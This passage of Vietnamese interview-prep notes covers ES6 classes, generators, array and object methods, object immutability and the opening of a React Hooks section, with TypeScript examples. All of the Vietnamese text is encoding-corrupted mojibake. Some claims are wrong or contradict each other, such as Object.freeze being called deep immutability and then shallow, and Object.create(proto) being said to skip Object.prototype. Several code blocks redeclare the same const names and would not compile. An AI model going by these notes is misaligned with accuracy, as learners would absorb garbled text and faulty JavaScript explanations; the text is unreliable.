**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"ES6 Classes l√† syntactic sugar tr√™n prototype-based inheritance, cung c·∫•p cleaner syntax cho constructor functions, inheritance, v√† encapsulation."**

**üîë 4 Kh√°i Ni·ªám Ch√≠nh:**

**1. Class Basics:**
- Syntax: `class Person { constructor(name) { this.name = name } method() {} }`
- **Syntactic sugar** tr√™n constructor functions + prototypes
- `new` keyword b·∫Øt bu·ªôc (kh√¥ng nh∆∞ functions)
- Methods t·ª± ƒë·ªông **non-enumerable**

**2. Inheritance (`extends`):**
- `class Child extends Parent` - k·∫ø th·ª´a prototype chain
- **`super()`** b·∫Øt bu·ªôc trong constructor (call parent constructor)
- `super.method()` - g·ªçi parent methods
- Method overriding: child method override parent c√πng t√™n

**3. Static Methods/Properties:**
- `static method()` - class-level, **kh√¥ng c·∫ßn instance**
- Call tr·ª±c ti·∫øp: `Person.staticMethod()`
- Use case: utility functions, factory methods (`Array.from()`, `Object.keys()`)

**4. Private Fields (ES2022):**
- `#privateField` - truly private (kh√¥ng access t·ª´ ngo√†i)
- Kh√°c `_convention` (ch·ªâ l√† naming, v·∫´n access ƒë∆∞·ª£c)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Qu√™n `super()` trong child constructor ‚Üí ReferenceError
- D√πng arrow functions cho methods ‚Üí `this` binding issues
- Pass method as callback m√† kh√¥ng bind ‚Üí `this` = undefined
- Nghƒ© class t·∫°o scope m·ªõi ‚Üí Sai! Ch·ªâ l√† syntax sugar

**üí° Ki·∫øn Th·ª©c Senior:**
- **Classes ARE functions**: `typeof MyClass === 'function'`
- **Hoisting difference**: Class declarations **kh√¥ng hoist** (TDZ), function declarations hoist
- **`this` binding**: Class methods kh√¥ng auto-bind `this` ‚Üí d√πng arrow functions ho·∫∑c `.bind()` trong constructor
- **Mixins pattern**: Combine multiple classes v·ªõi `Object.assign(MyClass.prototype, Mixin)`
- Composition > Inheritance (prefer "has-a" over "is-a" relationships)




**‚ö° Quick Summary:**
> ES6 Classes = syntactic sugar over prototypes. constructor, methods, static, inheritance

**üí° Ghi Nh·ªõ:**
- üèóÔ∏è **Class**: `class Name { constructor() {} method() {} }`
- üîó **Extends**: `class Child extends Parent { super() }`
- üìå **Static**: Class-level methods, kh√¥ng c·∫ßn instance

**Tr·∫£ l·ªùi:**

- **Classes**: Syntactic sugar cho constructor functions
- **Ho·∫°t ƒë·ªông**: T·∫°o objects v·ªõi methods v√† properties
- **∆Øu ƒëi·ªÉm**: Cleaner syntax, inheritance, encapsulation
- **Nh∆∞·ª£c ƒëi·ªÉm**: C√≥ th·ªÉ g√¢y confusion v·ªõi this binding

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Basic class
class Person {
  name: string;
  age: number;

  constructor(name: string, age: number) {
    this.name = name;
    this.age = age;
  }

  greet(): string {
    return `Hello, I'm ${this.name}`;
  }

  getAge(): number {
    return this.age;
  }
}

const person = new Person('John', 25);
console.log(person.greet()); // Ch√∫ gi·∫£i: "Hello, I'm John"

 // Ch√∫ gi·∫£i: Inheritance
class Student extends Person {
  grade: string;

  constructor(name: string, age: number, grade: string) {
    super(name, age);
    this.grade = grade;
  }

  study(): string {
    return `${this.name} is studying`;
  }

  greet(): string {
    return `Hello, I'm ${this.name} and I'm a student`;
  }
}

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // Ch√∫ gi·∫£i: "Hello, I'm Jane and I'm a student"

 // Ch√∫ gi·∫£i: Static methods
class MathUtils {
  static add(a: number, b: number): number {
    return a + b;
  }

  static multiply(a: number, b: number): number {
    return a * b;
  }
}

console.log(MathUtils.add(5, 3)); // Ch√∫ gi·∫£i: 8

 // Ch√∫ gi·∫£i: Getters and setters
class Circle {
  private _radius: number;

  constructor(radius: number) {
    this._radius = radius;
  }

  get radius(): number {
    return this._radius;
  }

  set radius(value: number) {
    if (value < 0) {
      throw new Error('Radius cannot be negative');
    }
    this._radius = value;
  }

  get area(): number {
    return Math.PI * this._radius * this._radius;
  }
}

const circle = new Circle(5);
console.log(circle.area); // Ch√∫ gi·∫£i: 78.54
circle.radius = 10;
console.log(circle.area); // Ch√∫ gi·∫£i: 314.16
```

**Best Practices:**

- S·ª≠ d·ª•ng classes cho object-oriented programming
- S·ª≠ d·ª•ng inheritance khi c·∫ßn
- S·ª≠ d·ª•ng static methods cho utility functions
- S·ª≠ d·ª•ng getters/setters cho data validation
---
## 23. üîÑ Q23: Generator Functions & Async Generators  

**P1: T√™n c√¢u h·ªèi:** üîÑ Q23: Generator Functions & Async Generators  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"Generators (function*) l√† functions c√≥ th·ªÉ pause/resume execution v·ªõi `yield`, tr·∫£ v·ªÅ iterator. Async generators k·∫øt h·ª£p v·ªõi async/await cho lazy async iteration."**

**üîë 3 Kh√°i Ni·ªám Ch√≠nh:**

**1. Generator Functions:**
- Syntax: `function* gen() { yield 1; yield 2; }`
- **Pause execution** t·∫°i `yield`, resume v·ªõi `.next()`
- Return **Iterator object** `{value, done}`
- Lazy evaluation - ch·ªâ compute khi `.next()` ƒë∆∞·ª£c g·ªçi

**2. Generator Methods:**
- `.next(value)` - resume, pass value v√†o yield expression
- `.return(value)` - terminate generator, set done=true
- `.throw(error)` - throw error t·∫°i yield statement
- `yield*` - delegate t·ªõi generator kh√°c

**3. Async Generators:**
- Syntax: `async function* gen() { yield await fetch() }`
- Iterate v·ªõi **`for await...of`**
- Use case: stream data (paginated API, file reading chunks, SSE)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Qu√™n `*` trong `function*` ‚Üí kh√¥ng ph·∫£i generator
- D√πng arrow functions ‚Üí **Kh√¥ng support** generators (`() =>*` invalid)
- Iterate generator nhi·ªÅu l·∫ßn ‚Üí ch·ªâ ch·∫°y 1 l·∫ßn (exhausted), ph·∫£i t·∫°o m·ªõi
- `return` trong generator ‚Üí set done=true nh∆∞ng `for...of` kh√¥ng nh·∫≠n return value

**üí° Ki·∫øn Th·ª©c Senior:**
- **Use cases**:
  - **Infinite sequences**: `function* fibonacci() { let [a,b]=[0,1]; while(true) yield [a,b]=[b,a+b] }`
  - **Lazy evaluation**: ch·ªâ compute khi c·ªán (memory efficient)
  - **State machines**: pause/resume cho complex flows
  - **Co-routines**: bi-directional communication (pass values v√†o `yield`)
- **Redux-Saga** d√πng generators cho side effects management
- **Async iteration protocol**: `Symbol.asyncIterator` cho custom async iterables
- Generators **kh√¥ng th·ªÉ arrow functions** v√¨ c·∫ßn `this` binding




**‚ö° Quick Summary:**
> Generator = function* v·ªõi yield. Pause/resume execution. Async generator = for await...of

**üí° Ghi Nh·ªõ:**
- ‚è∏Ô∏è **function***: Generator function v·ªõi yield
- ‚ñ∂Ô∏è **next()**: Resume execution, return {value, done}
- üîÑ **Async Gen**: async function* v·ªõi for await...of

**Tr·∫£ l·ªùi:**

- **Generator Functions**: Functions c√≥ th·ªÉ pause v√† resume execution
- **yield**: Keyword ƒë·ªÉ pause function v√† return value
- **yield\***: Delegate to another generator
- **Async Generators**: Generators v·ªõi async/await support
- **∆Øu ƒëi·ªÉm**: Memory efficient, lazy evaluation, complex iteration
- **Nh∆∞·ª£c ƒëi·ªÉm**: Complex syntax, not widely used

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Basic Generator Function
function* numberGenerator(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
  yield 3;
  return 4; // Ch√∫ gi·∫£i: Final value
}

const gen = numberGenerator();
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 1, done: false }
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 2, done: false }
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 3, done: false }
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 4, done: true }

 // Ch√∫ gi·∫£i: Generator v·ªõi parameters
function* counter(
  start: number,
  end: number
): Generator<number, void, unknown> {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

const counterGen = counter(1, 5);
for (const value of counterGen) {
  console.log(value); // Ch√∫ gi·∫£i: 1, 2, 3, 4, 5
}

 // Ch√∫ gi·∫£i: yield* - Delegate to another generator
function* generator1(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
}

function* generator2(): Generator<number, void, unknown> {
  yield 3;
  yield 4;
}

function* combinedGenerator(): Generator<number, void, unknown> {
  yield* generator1();
  yield* generator2();
  yield 5;
}

const combined = combinedGenerator();
console.log([...combined]); // Ch√∫ gi·∫£i: [1, 2, 3, 4, 5]

 // Ch√∫ gi·∫£i: Generator v·ªõi input values
function* inputGenerator(): Generator<number, void, number> {
  let value = yield 1;
  console.log('Received:', value);
  value = yield 2;
  console.log('Received:', value);
  return value;
}

const inputGen = inputGenerator();
console.log(inputGen.next()); // Ch√∫ gi·∫£i: { value: 1, done: false }
console.log(inputGen.next(10)); // Ch√∫ gi·∫£i: Received: 10, { value: 2, done: false }
console.log(inputGen.next(20)); // Ch√∫ gi·∫£i: Received: 20, { value: 20, done: true }

 // Ch√∫ gi·∫£i: Async Generator
async function* asyncNumberGenerator(): AsyncGenerator<number, void, unknown> {
  yield 1;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 2;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 3;
}

async function consumeAsyncGenerator(): Promise<void> {
  for await (const value of asyncNumberGenerator()) {
    console.log('Async value:', value);
  }
}

consumeAsyncGenerator(); // Ch√∫ gi·∫£i: Logs: Async value: 1, then 2, then 3

 // Ch√∫ gi·∫£i: Practical example: Data streaming
async function* dataStream(): AsyncGenerator<string, void, unknown> {
  const data = ['chunk1', 'chunk2', 'chunk3'];
  for (const chunk of data) {
    await new Promise((resolve) => setTimeout(resolve, 500));
    yield chunk;
  }
}

async function processStream(): Promise<void> {
  for await (const chunk of dataStream()) {
    console.log('Processing chunk:', chunk);
  }
}

processStream();

 // Ch√∫ gi·∫£i: Generator for infinite sequences
function* fibonacci(): Generator<number, void, unknown> {
  let a = 0,
    b = 1;
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
console.log(fib.next().value); // Ch√∫ gi·∫£i: 0
console.log(fib.next().value); // Ch√∫ gi·∫£i: 1
console.log(fib.next().value); // Ch√∫ gi·∫£i: 1
console.log(fib.next().value); // Ch√∫ gi·∫£i: 2
console.log(fib.next().value); // Ch√∫ gi·∫£i: 3
```

**Best Practices:**

- S·ª≠ d·ª•ng generators cho lazy evaluation
- S·ª≠ d·ª•ng async generators cho data streaming
- S·ª≠ d·ª•ng yield\* cho generator composition
- S·ª≠ d·ª•ng for...of v·ªõi generators

**Mistakes:**

```typescript
// ‚ùå Sai: Kh√¥ng hi·ªÉu generator state
const gen = numberGenerator();
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 1, done: false }
console.log(gen.next()); // Ch√∫ gi·∫£i: { value: 2, done: false }
 // Ch√∫ gi·∫£i: Generator state is maintained

// ‚úÖ ƒê√∫ng: Hi·ªÉu generator state
const gen = numberGenerator();
const values = [...gen]; // Ch√∫ gi·∫£i: [1, 2, 3]
 // Ch√∫ gi·∫£i: Generator is exhausted after iteration
```
---
## 24. üõ†Ô∏è Q24: Advanced Array & Object Methods, Object Concepts & Immutability  

**P1: T√™n c√¢u h·ªèi:** üõ†Ô∏è Q24: Advanced Array & Object Methods, Object Concepts & Immutability  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Advanced methods bao g·ªìm flat/flatMap, Array.from, Object.entries/values/keys; Object concepts g·ªìm prototype chain, Object.create, property descriptors; Immutability control v·ªõi freeze/seal/preventExtensions."**

**üîë 3 Nh√≥m Ch√≠nh:**

**1. Advanced Array Methods:**
- **`flat(depth)`**: Flatten nested arrays - `[1,[2,[3]]].flat(2)` ‚Üí `[1,2,3]`
- **`flatMap(fn)`**: map + flatten (efficient h∆°n `.map().flat()`)
- **`Array.from(iterable, mapFn)`**: T·∫°o array t·ª´ iterable + optional map
  - V√≠ d·ª•: `Array.from({length: 5}, (_, i) => i)` ‚Üí `[0,1,2,3,4]`
- **`entries/keys/values`**: Iterate index-value pairs

**2. Advanced Object Methods:**
- **`Object.entries(obj)`**: `{a:1, b:2}` ‚Üí `[['a',1], ['b',2]]` (iterate objects)
- **`Object.fromEntries()`**: Ng∆∞·ª£c l·∫°i entries ‚Üí object
- **`Object.values(obj)`**: L·∫•y m·ªôt values (kh√¥ng c·∫ßn keys)
- **`Object.assign(target, ...sources)`**: Shallow merge (mutate target)

**3. Object Concepts & Immutability:**
- **`Object.create(proto)`**: T·∫°o object v·ªõi specific prototype (kh√¥ng inherit Object.prototype)
- **`Object.freeze(obj)`**: **Deep immutable** - kh√¥ng th·ªÉ add/delete/modify properties
- **`Object.seal(obj)`**: Kh√¥ng add/delete nh∆∞ng **v·∫´n modify** ƒë∆∞·ª£c values
- **`Object.preventExtensions(obj)`**: Ch·ªâ kh√¥ng add properties m·ªõi
- **Property Descriptors**: `Object.defineProperty()` - control writable, enumerable, configurable

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- `Object.freeze()` ch·ªâ **shallow** ‚Üí nested objects v·∫´n mutable (d√πng deep-freeze libraries)
- `Object.assign()` **mutate target** ‚Üí d√πng `{...obj1, ...obj2}` cho immutable merge
- `.flat()` kh√¥ng specify depth ‚Üí default = 1 (kh√¥ng flatten h·∫øt)
- D√πng `for...in` iterate object m√† kh√¥ng check `hasOwnProperty` ‚Üí iterate c·∫£ prototype

**üí° Ki·∫øn Th·ª©c Senior:**
- **Prototype chain**: `obj.__proto__` (deprecated) vs `Object.getPrototypeOf(obj)`
- **Mixins pattern**: `Object.assign(MyClass.prototype, Mixin1, Mixin2)` - share behavior
- **Property descriptors**: `{value, writable, enumerable, configurable}` - fine-grained control
  - `Object.keys()` ch·ªâ l·∫•y enumerable properties
- **Immutability libraries**: Immer (structural sharing), Immutable.js (persistent data structures)
- **Performance**: `Object.create(null)` nhanh h∆°n `{}` (kh√¥ng c√≥ prototype overhead)




**Tr·∫£ l·ªùi:**

**Part 1: Advanced Array & Object Methods**
- **Advanced Array Methods**: flat, flatMap, from, of, entries, values, keys
- **Advanced Object Methods**: Object.assign, Object.entries, Object.values, Object.keys

**Part 2: Advanced Object Concepts**
- **Object.create()**: T·∫°o object v·ªõi specific prototype
- **Prototype Chain**: Mechanism cho inheritance
- **Mixin Pattern**: Share functionality between objects
- **Object.freeze/seal/preventExtensions**: Control object mutability
- **Property Descriptors**: Fine-grained property control

**∆Øu ƒëi·ªÉm**: Powerful manipulation, flexible inheritance, immutability control
**Nh∆∞·ª£c ƒëi·ªÉm**: Complex prototype chain, browser compatibility, learning curve

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Array.flat() - Flatten nested arrays
const nestedArray = [1, [2, 3], [4, [5, 6]]];
const flattened = nestedArray.flat(); // Ch√∫ gi·∫£i: [1, 2, 3, 4, [5, 6]]
const deeplyFlattened = nestedArray.flat(2); // Ch√∫ gi·∫£i: [1, 2, 3, 4, 5, 6]

// Array.flatMap() - Map v√† flatten
const numbers = [1, 2, 3, 4];
const doubled = numbers.flatMap((n) => [n, n * 2]); // Ch√∫ gi·∫£i: [1, 2, 2, 4, 3, 6, 4, 8]

 // Ch√∫ gi·∫£i: Array.from() - Create array from iterable
const arrayFromString = Array.from('hello'); // Ch√∫ gi·∫£i: ['h', 'e', 'l', 'l', 'o']
const arrayFromSet = Array.from(new Set([1, 2, 2, 3])); // Ch√∫ gi·∫£i: [1, 2, 3]
const arrayWithMapping = Array.from({ length: 5 }, (_, i) => i * 2); // Ch√∫ gi·∫£i: [0, 2, 4, 6, 8]

 // Ch√∫ gi·∫£i: Array.of() - Create array from arguments
const arrayOf = Array.of(1, 2, 3, 4); // Ch√∫ gi·∫£i: [1, 2, 3, 4]
const arrayOfSingle = Array.of(7); // Ch√∫ gi·∫£i: [7]

 // Ch√∫ gi·∫£i: Array.entries() - Get index-value pairs
const fruits = ['apple', 'banana', 'orange'];
for (const [index, fruit] of fruits.entries()) {
  console.log(`${index}: ${fruit}`);
}

 // Ch√∫ gi·∫£i: Array.values() - Get values
const values = fruits.values();
for (const value of values) {
  console.log(value);
}

 // Ch√∫ gi·∫£i: Array.keys() - Get indices
const keys = fruits.keys();
for (const key of keys) {
  console.log(key);
}

 // Ch√∫ gi·∫£i: Object.assign() - Copy properties
const target = { a: 1, b: 2 };
const source = { b: 3, c: 4 };
const result = Object.assign(target, source); // Ch√∫ gi·∫£i: { a: 1, b: 3, c: 4 }

 // Ch√∫ gi·∫£i: Object.entries() - Get key-value pairs
const person = { name: 'John', age: 30, city: 'HCM' };
const entries = Object.entries(person); // Ch√∫ gi·∫£i: [['name', 'John'], ['age', 30], ['city', 'HCM']]

 // Ch√∫ gi·∫£i: Object.values() - Get values
const values = Object.values(person); // Ch√∫ gi·∫£i: ['John', 30, 'HCM']

 // Ch√∫ gi·∫£i: Object.keys() - Get keys
const keys = Object.keys(person); // Ch√∫ gi·∫£i: ['name', 'age', 'city']

 // Ch√∫ gi·∫£i: Practical examples
function processUserData(users: any[]): any[] {
  return users
    .flatMap((user) => user.hobbies || []) // Ch√∫ gi·∫£i: Flatten hobbies
    .filter((hobby) => hobby.length > 3) // Ch√∫ gi·∫£i: Filter long hobbies
    .map((hobby) => hobby.toUpperCase()); // Ch√∫ gi·∫£i: Transform
}

function createLookupTable(objects: any[]): Map<string, any> {
  return new Map(
    objects.flatMap((obj) =>
      Object.entries(obj).map(([key, value]) => [key, obj])
    )
  );
}

function mergeObjects(...objects: any[]): any {
  return objects.reduce((acc, obj) => Object.assign(acc, obj), {});
}

function getObjectStats(obj: any): {
  keys: number;
  values: any[];
  entries: [string, any][];
} {
  return {
    keys: Object.keys(obj).length,
    values: Object.values(obj),
    entries: Object.entries(obj),
  };
}

 // Ch√∫ gi·∫£i: Advanced usage
function transformData(data: any[]): any[] {
  return data
    .flatMap((item) => item.items || []) // Ch√∫ gi·∫£i: Flatten nested items
    .map((item) => ({
      ...item,
      processed: true,
      timestamp: Date.now(),
    }))
    .filter((item) => item.active);
}

function createIndexMap(data: any[]): Map<string, any[]> {
  const indexMap = new Map();

  data.forEach((item) => {
    Object.entries(item).forEach(([key, value]) => {
      if (!indexMap.has(key)) {
        indexMap.set(key, []);
      }
      indexMap.get(key).push(value);
    });
  });

  return indexMap;
}
```

**Best Practices:**

- S·ª≠ d·ª•ng flat() cho nested arrays
- S·ª≠ d·ª•ng flatMap() cho map v√† flatten
- S·ª≠ d·ª•ng Object.entries() cho iteration
- S·ª≠ d·ª•ng Object.assign() cho object merging
- S·ª≠ d·ª•ng Array.from() cho array creation

**Mistakes - Array Methods:**

```typescript
// ‚ùå Sai: Kh√¥ng hi·ªÉu flat depth
const nested = [1, [2, [3, [4]]]];
const flattened = nested.flat(); // Ch√∫ gi·∫£i: [1, 2, [3, [4]]] - only 1 level

// ‚úÖ ƒê√∫ng: Specify depth
const deeplyFlattened = nested.flat(Infinity); // Ch√∫ gi·∫£i: [1, 2, 3, 4]
```

**Part 2: Advanced Object Concepts - Prototype, Inheritance & Immutability**

**Code Example - Object.create() & Prototype Chain:**

```typescript
 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
const personPrototype = {
  greet(): string {
    return `Hello, I'm ${this.name}`;
  },
  getAge(): number {
    return this.age;
  },
};

const person = Object.create(personPrototype);
person.name = 'John';
person.age = 30;

console.log(person.greet()); // Ch√∫ gi·∫£i: "Hello, I'm John"
console.log(person.getAge()); // Ch√∫ gi·∫£i: 30

 // Nguy√™n m·∫´u (prototype): c∆° ch·∫ø k·∫ø th·ª´a theo chu·ªói trong JS; `class` ch·ªâ l√† c√∫ ph√°p sugar tr√™n prototype.
function Person(name: string, age: number) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function (): string {
  return `Hello, I'm ${this.name}`;
};

function Student(name: string, age: number, grade: string) {
  Person.call(this, name, age);
  this.grade = grade;
}

 // Ch√∫ gi·∫£i: Set up inheritance
Student.prototype = Object.create(Person.prototype);
Student.prototype.constructor = Student;

Student.prototype.study = function (): string {
  return `${this.name} is studying`;
};

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // Ch√∫ gi·∫£i: "Hello, I'm Jane"
console.log(student.study()); // Ch√∫ gi·∫£i: "Jane is studying"

 // Ch√∫ gi·∫£i: Mixin pattern
const canFly = {
  fly(): string {
    return `${this.name} is flying`;
  },
};

const canSwim = {
  swim(): string {
    return `${this.name} is swimming`;
  },
};

function mixin(target: any, ...sources: any[]): any {
  sources.forEach((source) => {
    Object.getOwnPropertyNames(source).forEach((name) => {
      if (name !== 'constructor') {
        target[name] = source[name];
      }
    });
  });
  return target;
}

function Bird(name: string) {
  this.name = name;
}

mixin(Bird.prototype, canFly);

const bird = new Bird('Eagle');
console.log(bird.fly()); // Ch√∫ gi·∫£i: "Eagle is flying"

 // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn. B·∫•t bi·∫øn: gi√° tr·ªã kh√¥ng thay ƒë·ªïi sau khi t·∫°o; th∆∞·ªùng d√πng ƒë·ªÉ tr√°nh side-effect v√† d·ªÖ reasoning.
const frozenObject = Object.freeze({
  name: 'John',
  age: 30,
  address: {
    city: 'HCM',
  },
});

 // Ch√∫ gi·∫£i: frozenObject.name = 'Jane'; // Error in strict mode
 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.

 // Sao ch√©p s√¢u: sao ch√©p ƒë·ªá quy m·ªçi c·∫•p ƒë·ªÉ t·∫°o b·∫£n sao ƒë·ªôc l·∫≠p; c√≥ th·ªÉ t·ªën hi·ªáu su·∫•t.
function deepFreeze(obj: any): any {
  Object.getOwnPropertyNames(obj).forEach((prop) => {
    if (obj[prop] !== null && typeof obj[prop] === 'object') {
      deepFreeze(obj[prop]);
    }
  });
  return Object.freeze(obj);
}

const deeplyFrozen = deepFreeze({
  name: 'John',
  address: {
    city: 'HCM',
  },
});

 // Ch√∫ gi·∫£i: Object.seal() - Prevent adding/removing properties
const sealedObject = Object.seal({
  name: 'John',
  age: 30,
});

 // Ch√∫ gi·∫£i: sealedObject.name = 'Jane'; // OK
 // Ch√∫ gi·∫£i: sealedObject.city = 'HCM'; // Error in strict mode
 // Ch√∫ gi·∫£i: delete sealedObject.age; // Error in strict mode

 // Ch√∫ gi·∫£i: Object.preventExtensions() - Prevent adding properties
const nonExtensibleObject = Object.preventExtensions({
  name: 'John',
  age: 30,
});

 // Ch√∫ gi·∫£i: nonExtensibleObject.name = 'Jane'; // OK
 // Ch√∫ gi·∫£i: nonExtensibleObject.city = 'HCM'; // Error in strict mode
 // Ch√∫ gi·∫£i: delete nonExtensibleObject.age; // OK

 // Ch√∫ gi·∫£i: Property descriptors
const obj = { name: 'John' };

Object.defineProperty(obj, 'age', {
  value: 30,
  writable: false,
  enumerable: true,
  configurable: false,
});

 // Ch√∫ gi·∫£i: obj.age = 40; // Error in strict mode
 // Ch√∫ gi·∫£i: delete obj.age; // Error in strict mode

 // Ch√∫ gi·∫£i: Get property descriptor
const descriptor = Object.getOwnPropertyDescriptor(obj, 'age');
console.log(descriptor); // Ch√∫ gi·∫£i: { value: 30, writable: false, enumerable: true, configurable: false }

 // Ch√∫ gi·∫£i: Object.getOwnPropertyNames() vs Object.keys()
const obj = { a: 1, b: 2 };
Object.defineProperty(obj, 'c', {
  value: 3,
  enumerable: false,
});

console.log(Object.keys(obj)); // Ch√∫ gi·∫£i: ['a', 'b']
console.log(Object.getOwnPropertyNames(obj)); // Ch√∫ gi·∫£i: ['a', 'b', 'c']

 // Ch√∫ gi·∫£i: hasOwnProperty vs in operator
const obj = { a: 1 };
console.log(obj.hasOwnProperty('a')); // Ch√∫ gi·∫£i: true
console.log('a' in obj); // Ch√∫ gi·∫£i: true
console.log(obj.hasOwnProperty('toString')); // Ch√∫ gi·∫£i: false
console.log('toString' in obj); // Ch√∫ gi·∫£i: true

 // Ch√∫ gi·∫£i: Practical examples
function createImmutableObject(data: any): any {
  return Object.freeze(
    Object.keys(data).reduce((acc, key) => {
      acc[key] =
        typeof data[key] === 'object' ? deepFreeze(data[key]) : data[key];
      return acc;
    }, {} as any)
  );
}

function createMixin(...mixins: any[]): any {
  return function (target: any): any {
    mixins.forEach((mixin) => {
      Object.getOwnPropertyNames(mixin).forEach((name) => {
        if (name !== 'constructor') {
          target[name] = mixin[name];
        }
      });
    });
    return target;
  };
}

 // Ch√∫ gi·∫£i: Usage
const withLogging = createMixin({
  log(message: string): void {
    console.log(`${this.name}: ${message}`);
  },
});

function User(name: string) {
  this.name = name;
}

withLogging(User.prototype);

const user = new User('John');
user.log('Hello'); // Ch√∫ gi·∫£i: "John: Hello"
```

**Best Practices - Combined:**

- **Array Methods**: S·ª≠ d·ª•ng flat() cho nested arrays, flatMap() cho map v√† flatten
- **Object Methods**: S·ª≠ d·ª•ng Object.entries() cho iteration, Object.assign() cho merging
- **Prototype**: S·ª≠ d·ª•ng Object.create() cho prototype-based inheritance
- **Mixins**: S·ª≠ d·ª•ng mixins cho functionality sharing
- **Immutability**: S·ª≠ d·ª•ng Object.freeze() cho immutability, Object.seal() cho controlled mutability
- **Property Descriptors**: S·ª≠ d·ª•ng proper property descriptors cho fine-grained control

**Mistakes - Object Concepts:**

```typescript
// ‚ùå Sai: Kh√¥ng hi·ªÉu shallow vs deep freeze
const obj = Object.freeze({ a: { b: 1 } });
obj.a.b = 2; // Ch√∫ gi·∫£i: Still works!

// ‚úÖ ƒê√∫ng: Deep freeze
const obj = deepFreeze({ a: { b: 1 } });
obj.a.b = 2; // Ch√∫ gi·∫£i: Error in strict mode
```

---
---
## 25. ‚öõÔ∏è Q25: React Hooks & Advanced Patterns - Lifecycle, Performance, Architecture  

**P1: T√™n c√¢u h·ªèi:** ‚öõÔ∏è Q25: React Hooks & Advanced Patterns - Lifecycle, Performance, Architecture  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"React Hooks thay th·∫ø Class Components v·ªõi API s·∫°ch h∆°n v√† t√°i s·ª≠ d·ª•ng t·ªët h∆°n.**

**ü™ù Hooks C·ªët L√µi (B·∫Øt Bu·ªôc Bi·∫øt):**
1. **useState**: Qu·∫£n l√Ω state. C·∫≠p nh·∫≠t theo h√†m `setState(prev => prev + 1)` tr√°nh closure c≈©.
2. **useEffect**: Hi·ªáu ·ª©ng ph·ª•, v√≤ng ƒë·ªùi. H√†m cleanup ngƒÉn r√≤ r·ªâ b·ªô nh·ªõ. M·∫£ng ph·ª• thu·ªôc ki·ªÉm so√°t ch·∫°y l·∫°i.
3. **useRef**: Gi√° tr·ªã thay ƒë·ªïi ƒë∆∞·ª£c nh∆∞ng kh√¥ng g√¢y render l·∫°i. Truy c·∫≠p DOM, l∆∞u gi√° tr·ªã tr∆∞·ªõc, timers.
4. **useMemo**: Cache t√≠nh to√°n n·∫∑ng. Ch·ªâ t√≠nh l·∫°i khi dependencies thay ƒë·ªïi.
5. **useCallback**: Cache tham chi·∫øu h√†m. NgƒÉn component con render l·∫°i khi truy·ªÅn callbacks.
6. **useContext**: Truy c·∫≠p gi√° tr·ªã Context. Tr√°nh prop drilling.
7. **useReducer**: Logic state ph·ª©c t·∫°p. Thay th·∫ø useState khi c√≥ nhi·ªÅu gi√° tr·ªã ph·ª•.

**üîÑ √Ånh X·∫° V√≤ng ƒê·ªùi (Class ‚Üí Hooks):**
- **componentDidMount**: `useEffect(() => {}, [])`
- **componentDidUpdate**: `useEffect(() => {}, [deps])`
- **componentWillUnmount**: `useEffect(() => { return cleanup }, [])`
- **getDerivedStateFromProps**: `useMemo(() => compute(props), [props])`
- **shouldComponentUpdate**: `React.memo()` + `useMemo/useCallback`

**‚öôÔ∏è Virtual DOM v√† Reconciliation:**
- **Virtual DOM**: Bi·ªÉu di·ªÖn c√¢y trong b·ªô nh·ªõ ‚Üí thu·∫≠t to√°n so s√°nh nhanh.
- **Reconciliation**: So s√°nh VDOM c≈© vs m·ªõi ‚Üí c·∫≠p nh·∫≠t DOM t·ªëi thi·ªÉu.
- **Prop key**: Gi√∫p React nh·∫≠n di·ªán item n√†o thay ƒë·ªïi ‚Üí c·∫≠p nh·∫≠t danh s√°ch hi·ªáu qu·∫£. KH√îNG bao gi·ªù d√πng index l√†m key khi danh s√°ch ƒë·ªông.
